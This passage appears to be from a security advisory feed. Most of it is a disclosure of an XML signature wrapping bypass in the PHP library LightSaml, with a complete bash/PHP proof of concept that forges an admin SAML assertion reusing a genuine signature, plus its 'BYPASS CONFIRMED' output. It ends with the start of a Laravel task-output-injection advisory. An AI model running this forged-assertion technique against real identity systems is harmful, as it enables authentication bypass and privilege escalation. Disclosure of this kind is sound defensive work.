echo $bypass ? "RESULT: BYPASS CONFIRMED\n" : "RESULT: no bypass\n";
exit($bypass ? 0 : 1);
PHP

ASSERTION #0  NameID=attacker@evil.com  Attributes={"role":"admin"}

RESULT: BYPASS CONFIRMED

Impact

An example attacker buries the genuine signed bytes (the assertion with its ds:Signature element stripped) inside samlp:Extensions, so it is the first @Id element in document order but not a direct-child assertion. Present one forged direct-child assertion with the same ID, attacker claims, and a verbatim copy of the genuine ds:Signature:

<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion" ID="_resp" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>https://idp.example.com</saml:Issuer>

  <!-- GENUINE signed bytes, buried in Extensions: first @Id document-wide (xmlseclibs picks this),
       but NOT a direct-child assertion (LightSaml ignores it). Signature element removed so the
       enveloped+exc-c14n digest target is the assertion sans Signature. -->
  <samlp:Extensions>
    <saml:Assertion ID="_signed_assertion" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
      <saml:Issuer>https://idp.example.com</saml:Issuer>
      <saml:Subject><saml:NameID>alice@example.com</saml:NameID></saml:Subject>
      <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
      <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
    </saml:Assertion>
  </samlp:Extensions>

  <!-- FORGED: the ONLY direct-child assertion LightSaml collects. SAME ID, attacker claims,
       verbatim copy of the genuine ds:Signature. -->
  <saml:Assertion ID="_signed_assertion" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>https://idp.example.com</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"> ...byte-for-byte copy of the genuine signature... </ds:Signature>
    <saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2040-01-01T00:00:00Z" NotOnOrAfter="2041-01-01T00:00:00Z"/>
    <saml:AttributeStatement><saml:Attribute Name="role"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>

PoC

#!/usr/bin/env bash
set -euo pipefail
WORK="$(mktemp -d)"; trap 'rm -rf "$WORK"' EXIT; cd "$WORK"
IDP_ENTITY="https://idp.example.com"; ASSERTION_ID="_signed_assertion"

composer require litesaml/lightsaml:5.0.0 --no-interaction --quiet

# trusted IdP key + self-signed cert (out-of-band trust anchor)
openssl req -x509 -newkey rsa:2048 -keyout idp_key.pem -out idp_cert.pem -days 3650 -nodes \
  -subj "/CN=idp.example.com" >/dev/null 2>&1

# genuine Response with one to-be-signed assertion
cat > genuine_tmpl.xml <<XML
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"
                ID="_resp" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
  <saml:Issuer>${IDP_ENTITY}</saml:Issuer>
  <saml:Assertion ID="${ASSERTION_ID}" Version="2.0" IssueInstant="2024-01-01T00:00:00Z">
    <saml:Issuer>${IDP_ENTITY}</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignedInfo>
        <ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
        <ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>
        <ds:Reference URI="#${ASSERTION_ID}">
          <ds:Transforms>
            <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
            <ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>
          </ds:Transforms>
          <ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/>
          <ds:DigestValue></ds:DigestValue>
        </ds:Reference>
      </ds:SignedInfo>
      <ds:SignatureValue></ds:SignatureValue>
    </ds:Signature>
    <saml:Subject><saml:NameID>alice@example.com</saml:NameID></saml:Subject>
    <saml:Conditions NotBefore="2024-01-01T00:00:00Z" NotOnOrAfter="2099-01-01T00:00:00Z"/>
    <saml:AttributeStatement>
      <saml:Attribute Name="role"><saml:AttributeValue>user</saml:AttributeValue></saml:Attribute>
    </saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
XML

# REAL signature over the genuine assertion (RSA-SHA256, enveloped + exc-c14n)
xmlsec1 --sign --lax-key-search --privkey-pem idp_key.pem \
  --id-attr:ID "urn:oasis:names:tc:SAML:2.0:assertion:Assertion" \
  --output genuine_signed.xml genuine_tmpl.xml >/dev/null

# TAMPER: bury the genuine bytes (signature stripped) in samlp:Extensions as the first @Id element,
# and make the ONLY direct-child assertion a forged one carrying a verbatim copy of the genuine
# signature + attacker claims.
php -r '
$doc = new DOMDocument(); $doc->load("genuine_signed.xml");
$xp = new DOMXPath($doc);
$xp->registerNamespace("saml","urn:oasis:names:tc:SAML:2.0:assertion");
$xp->registerNamespace("ds","http://www.w3.org/2000/09/xmldsig#");
$resp = $doc->documentElement;
$genuine = $xp->query("//saml:Assertion[@ID=\"_signed_assertion\"]")->item(0);
$copiedSig = $doc->saveXML($xp->query("./ds:Signature", $genuine)->item(0));

// buried = genuine clone WITHOUT its signature (the enveloped+exc-c14n digest target)
$buried = $genuine->cloneNode(true);
$buried->removeChild($xp->query("./ds:Signature", $buried)->item(0));

// forged = copied signature + attacker claims (the only direct-child assertion)
$forged =
  "<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" ID=\"_signed_assertion\" Version=\"2.0\" IssueInstant=\"2024-01-01T00:00:00Z\">"
  ."<saml:Issuer>https://idp.example.com</saml:Issuer>".$copiedSig
  ."<saml:Subject><saml:NameID>attacker@evil.com</saml:NameID></saml:Subject>"
  ."<saml:Conditions NotBefore=\"2040-01-01T00:00:00Z\" NotOnOrAfter=\"2041-01-01T00:00:00Z\"/>"
  ."<saml:AttributeStatement><saml:Attribute Name=\"role\"><saml:AttributeValue>admin</saml:AttributeValue></saml:Attribute></saml:AttributeStatement>"
  ."</saml:Assertion>";
$frag = $doc->createDocumentFragment(); $frag->appendXML($forged);

// Extensions(buried genuine) replaces the original assertion (first @Id, doc order); forged appended after
$ext = $doc->createElementNS("urn:oasis:names:tc:SAML:2.0:protocol","samlp:Extensions");
$ext->appendChild($buried);
$resp->replaceChild($ext, $genuine);
$resp->appendChild($frag);
file_put_contents("tampered.xml", $doc->saveXML());
'

# SP consumer: LightSaml real per-assertion validation, pinned cert, requireSignature=true
cat > consumer.php <<'PHP'
<?php
require __DIR__ . '/vendor/autoload.php';
use LightSaml\Action\Assertion\Inbound\AssertionSignatureValidatorAction;
use LightSaml\Context\Profile\{AssertionContext, ProfileContext};
use LightSaml\Credential\{UsageType, X509Certificate, X509Credential};
use LightSaml\Context\Model\DeserializationContext;   // moved from Model\Context in 5.0.0
use LightSaml\Model\Protocol\SamlMessage;
use LightSaml\Resolver\Credential\Factory\CredentialResolverFactory;
use LightSaml\Store\Credential\StaticCredentialStore;
use LightSaml\Validator\Model\Signature\SignatureValidator;
use Psr\Log\NullLogger;

[$_, $xmlPath, $certPath, $idpEntityId] = $argv;
$x509 = new X509Certificate(); $x509->loadPem(file_get_contents($certPath));   // pinned trust anchor
$cred = new X509Credential($x509); $cred->setEntityId($idpEntityId); $cred->setUsageType(UsageType::SIGNING);
$store = new StaticCredentialStore(); $store->add($cred);
$validator = new SignatureValidator((new CredentialResolverFactory($store))->build());
$action = new AssertionSignatureValidatorAction(new NullLogger(), $validator, true); // requireSignature=true

$message = SamlMessage::fromXML(file_get_contents($xmlPath), new DeserializationContext());
$profile = new ProfileContext('profile', ProfileContext::ROLE_SP);
$bypass = false;
echo "assertions LightSaml collected: " . count($message->getAllAssertions()) . "\n";
foreach ($message->getAllAssertions() as $i => $a) {
    $nameId = ($a->getSubject() && $a->getSubject()->getNameID()) ? $a->getSubject()->getNameID()->getValue() : '(none)';
    $attrs = [];
    foreach ($a->getAllAttributeStatements() as $s) foreach ($s->getAllAttributes() as $at)
        $attrs[$at->getName()] = implode(',', array_map(fn($v) => (string)$v, $at->getAllAttributeValues()));
    echo "ASSERTION #$i  NameID=$nameId  Attributes=".json_encode($attrs)."\n";
    $ctx = new AssertionContext(); $ctx->setAssertion($a); $ctx->setParent($profile);
    try { $action->execute($ctx); $r = 'ACCEPTED'; } catch (\Throwable $e) { $r = 'REJECTED: '.$e->getMessage(); }
    echo "  LightSaml validation: $r\n";
    if ($r === 'ACCEPTED' && (strpos($nameId,'evil.com') !== false || ($attrs['role'] ?? '') === 'admin')) {
        $bypass = true; echo "  >>> BYPASS: forged assertion validated AND attacker claims surfaced\n";
    }
}
echo $bypass ? "RESULT: BYPASS CONFIRMED\n" : "RESULT: no bypass\n";
exit($bypass ? 0 : 1);
PHP

php consumer.php tampered.xml idp_cert.pem "$IDP_ENTITY"

Observed output:

assertions LightSaml collected: 1
ASSERTION #0  NameID=attacker@evil.com  Attributes={"role":"admin"}
  LightSaml validation: ACCEPTED
  >>> BYPASS: forged assertion validated AND attacker claims surfaced
RESULT: BYPASS CONFIRMED

Impact

Authentication bypass / privilege escalation. An attacker who has captured one genuine signed assertion (e.g. their own prior login response) can have LightSaml accept a single, fully attacker-authored assertion as IdP-signed.

entry.title: [laravel/framework] Laravel: Task Output Injection - Concurrency Process
entry.content:
Summary

If a concurrency task prints user-controlled text, an attacker can forge the framework's internal result message and achieve remote code execution in certain conditions

Pre-reqs

Insecure code and insecure handling of user provided input (devs trust user-provided input) :

  1. App has a route that reaches Concurrency::run() (Not by default, it requires app code)

  2. The task writes user-controlled data to stdout (echo/print/dd of input, hand-built JSON via string concat, passthrough of tool output), and the user-controlled bytes can be made to start the child's stdout and form a complete JSON document followed by \x1f\x8b (Not by default, requires the specific coding pattern in the app code)

Patches

  • 13.40.0
  • 12.71.0

References
